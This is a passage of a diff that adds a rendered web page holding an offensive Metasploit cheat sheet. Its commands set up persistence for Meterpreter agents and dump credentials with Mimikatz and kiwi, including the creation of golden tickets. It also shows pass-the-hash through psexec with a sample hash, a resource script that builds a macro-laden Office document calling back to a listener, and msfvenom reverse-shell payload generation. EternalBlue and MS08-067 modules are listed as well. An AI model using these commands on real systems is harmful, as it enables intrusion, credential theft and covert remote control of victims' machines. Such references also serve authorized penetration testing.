+</span></span><span style="display:flex;"><span>-L &lt;opt&gt;  Location <span style="color:#66d9ef">in</span> target host to write payload to, <span style="color:#66d9ef">if</span> none <span style="color:#66d9ef">%</span>TEMP% will be used.
+</span></span><span style="display:flex;"><span>-P &lt;opt&gt;  Payload to use, <span style="color:#66d9ef">default</span> is windows/meterpreter/reverse_tcp.
+</span></span><span style="display:flex;"><span>-S        Automatically start the agent on boot as a service (with SYSTEM privileges)
+</span></span><span style="display:flex;"><span>-T &lt;opt&gt;  Alternate executable template to use
+</span></span><span style="display:flex;"><span>-U        Automatically start the agent when the User logs on
+</span></span><span style="display:flex;"><span>-X        Automatically start the agent when the system boots
+</span></span><span style="display:flex;"><span>-h        This help menu
+</span></span><span style="display:flex;"><span>-i &lt;opt&gt;  The interval <span style="color:#66d9ef">in</span> seconds between each connection attempt
+</span></span><span style="display:flex;"><span>-p &lt;opt&gt;  The port on which the system running Metasploit is listening
+</span></span><span style="display:flex;"><span>-r &lt;opt&gt;  The IP of the system running Metasploit listening <span style="color:#66d9ef">for</span> the connect back
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>meterpreter &gt; run persistence -U -p <span style="color:#ae81ff">4242</span>
+</span></span></code></pre></div><h3 id="network-monitoring">
+  Network Monitoring
+  <a class="anchor" href="#network-monitoring">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># list interfaces</span>
+</span></span><span style="display:flex;"><span>run packetrecorder -li
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># record interface n°1</span>
+</span></span><span style="display:flex;"><span>run packetrecorder -i <span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><h3 id="portforward">
+  Portforward
+  <a class="anchor" href="#portforward">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>portfwd add -l <span style="color:#ae81ff">7777</span> -r <span style="color:#ae81ff">172.17</span>.0.2 -p <span style="color:#ae81ff">3006</span>
+</span></span></code></pre></div><h3 id="upload--download">
+  Upload / Download
+  <a class="anchor" href="#upload--download">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>upload /path/<span style="color:#66d9ef">in</span>/hdd/payload.exe exploit.exe
+</span></span><span style="display:flex;"><span>download /path/<span style="color:#66d9ef">in</span>/victim
+</span></span></code></pre></div><h3 id="execute-from-memory">
+  Execute from Memory
+  <a class="anchor" href="#execute-from-memory">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>execute -H -i -c -m -d calc.exe <span style="color:#f92672">-f</span> /root/wce.exe -a  -w
+</span></span></code></pre></div><h3 id="mimikatz">
+  Mimikatz
+  <a class="anchor" href="#mimikatz">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>load mimikatz
+</span></span><span style="display:flex;"><span>mimikatz_command <span style="color:#f92672">-f</span> version
+</span></span><span style="display:flex;"><span>mimikatz_command <span style="color:#f92672">-f</span> samdump::hashes
+</span></span><span style="display:flex;"><span>mimikatz_command <span style="color:#f92672">-f</span> sekurlsa::wdigest
+</span></span><span style="display:flex;"><span>mimikatz_command <span style="color:#f92672">-f</span> sekurlsa::searchPasswords
+</span></span><span style="display:flex;"><span>mimikatz_command <span style="color:#f92672">-f</span> sekurlsa::logonPasswords full
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>load kiwi
+</span></span><span style="display:flex;"><span>creds_all
+</span></span><span style="display:flex;"><span>golden_ticket_create -d &lt;domainname&gt; -k &lt;nthashof krbtgt&gt; -s &lt;SID without le RID&gt; -u &lt;user_for_the_ticket&gt; -t &lt;location_to_store_tck&gt;
+</span></span></code></pre></div><h3 id="pass-the-hash---psexec">
+  Pass the Hash - PSExec
+  <a class="anchor" href="#pass-the-hash---psexec">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>msf &gt; use exploit/windows/smb/psexec
+</span></span><span style="display:flex;"><span>msf exploit(psexec) &gt; set payload windows/meterpreter/reverse_tcp
+</span></span><span style="display:flex;"><span>msf exploit(psexec) &gt; exploit
+</span></span><span style="display:flex;"><span>SMBDomain             WORKGROUP                                                          no        The Windows domain to use <span style="color:#66d9ef">for</span> authentication
+</span></span><span style="display:flex;"><span>SMBPass               598ddce2660d3193aad3b435b51404ee<span style="color:#960050;background-color:#1e0010">:</span>2d20d252a479f485cdf5e171d93985bf  no        The password <span style="color:#66d9ef">for</span> the specified username
+</span></span><span style="display:flex;"><span>SMBUser               Lambda                                                             no        The username to authenticate as
+</span></span></code></pre></div><h3 id="use-socks-proxy">
+  Use SOCKS Proxy
+  <a class="anchor" href="#use-socks-proxy">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>setg Proxies socks4<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">127.0</span>.0.<span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">1080</span>
+</span></span></code></pre></div><h2 id="scripting-metasploit">
+  Scripting Metasploit
+  <a class="anchor" href="#scripting-metasploit">#</a>
+</h2>
+<p>Using a <code>.rc file</code>, write the commands to execute, then run <code>msfconsole -r ./file.rc</code>.
+Here is a simple example to script the deployment of a handler an create an Office doc with macro.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>use exploit/multi/handler
+</span></span><span style="display:flex;"><span>set PAYLOAD windows/meterpreter/reverse_https
+</span></span><span style="display:flex;"><span>set LHOST <span style="color:#ae81ff">0.0</span>.0.0
+</span></span><span style="display:flex;"><span>set LPORT <span style="color:#ae81ff">4646</span>
+</span></span><span style="display:flex;"><span>set ExitOnSession false
+</span></span><span style="display:flex;"><span>exploit -j -z
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>use exploit/multi/fileformat/office_word_macro 
+</span></span><span style="display:flex;"><span>set PAYLOAD windows/meterpreter/reverse_https
+</span></span><span style="display:flex;"><span>set LHOST <span style="color:#ae81ff">10.10</span>.14.22
+</span></span><span style="display:flex;"><span>set LPORT <span style="color:#ae81ff">4646</span>
+</span></span><span style="display:flex;"><span>exploit
+</span></span></code></pre></div><h2 id="multiple-transports">
+  Multiple transports
+  <a class="anchor" href="#multiple-transports">#</a>
+</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>msfvenom -p windows/meterpreter_reverse_tcp lhost=&lt;host&gt; lport=&lt;port&gt; sessionretrytotal=<span style="color:#ae81ff">30</span> sessionretrywait=<span style="color:#ae81ff">10</span> extensions=stdapi,priv,powershell extinit=powershell,/home/ionize/AddTransports.ps1 <span style="color:#f92672">-f</span> exe
+</span></span></code></pre></div><p>Then, in AddTransports.ps1</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Add-TcpTransport -lhost &lt;host&gt; -lport &lt;port&gt; -RetryWait <span style="color:#ae81ff">10</span> -RetryTotal <span style="color:#ae81ff">30</span>
+</span></span><span style="display:flex;"><span>Add-WebTransport -Url http(s)<span style="color:#960050;background-color:#1e0010">:</span>//&lt;host&gt;<span style="color:#960050;background-color:#1e0010">:</span>&lt;port&gt;/&lt;luri&gt; -RetryWait <span style="color:#ae81ff">10</span> -RetryTotal <span style="color:#ae81ff">30</span>
+</span></span></code></pre></div><h2 id="best-of---exploits">
+  Best of - Exploits
+  <a class="anchor" href="#best-of---exploits">#</a>
+</h2>
+<ul>
+<li>MS17-10 Eternal Blue - <code>exploit/windows/smb/ms17_010_eternalblue</code></li>
+<li>MS08_67 - <code>exploit/windows/smb/ms08_067_netapi</code></li>
+</ul>
+<h2 id="references">
+  References
+  <a class="anchor" href="#references">#</a>
+</h2>
+<ul>
+<li>
+  <a href="https://ionize.com.au/multiple-transports-in-a-meterpreter-payload/">Multiple transports in a meterpreter payload - ionize</a></li>
+<li>
+  <a href="https://netsec.ws/?p=331">Creating Metasploit Payloads - Peleus</a></li>
+</ul>
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+
+
+
+  <div>
+    <a class="flex align-center" href="https://github.com/m00tiny/grayhatfreelancing/edit/main/exampleSite/content.en/docs/metasploit_cheatsheet.md" target="_blank" rel="noopener">
+      <img src="/svg/edit.svg" class="book-icon" alt="Edit" />
+      <span>Edit this page</span>
+    </a>
+  </div>
+
+
+</div>
+
+
+
+  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
+
+
+ 
+        
+      </footer>
+
+      
+  
+ 
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+    <aside class="book-toc">
+      <div class="book-toc-content">
+        
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#metasploit">Metasploit</a>
+      <ul>
+        <li><a href="#installation">Installation</a></li>
+        <li><a href="#sessions">Sessions</a></li>
+        <li><a href="#background-handler">Background handler</a></li>
+        <li><a href="#meterpreter---basic">Meterpreter - Basic</a>
+          <ul>
+            <li><a href="#generate-a-meterpreter">Generate a meterpreter</a></li>
+            <li><a href="#meterpreter-webdelivery">Meterpreter Webdelivery</a></li>
+            <li><a href="#get-system">Get System</a></li>
+            <li><a href="#persistence-startup">Persistence Startup</a></li>
+            <li><a href="#network-monitoring">Network Monitoring</a></li>
+            <li><a href="#portforward">Portforward</a></li>
+            <li><a href="#upload--download">Upload / Download</a></li>
+            <li><a href="#execute-from-memory">Execute from Memory</a></li>
+            <li><a href="#mimikatz">Mimikatz</a></li>
+            <li><a href="#pass-the-hash---psexec">Pass the Hash - PSExec</a></li>
+            <li><a href="#use-socks-proxy">Use SOCKS Proxy</a></li>
+          </ul>
+        </li>
+        <li><a href="#scripting-metasploit">Scripting Metasploit</a></li>
+        <li><a href="#multiple-transports">Multiple transports</a></li>
+        <li><a href="#best-of---exploits">Best of - Exploits</a></li>
+        <li><a href="#references">References</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+ 
+      </div>
+    </aside>
+    
+  </main>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
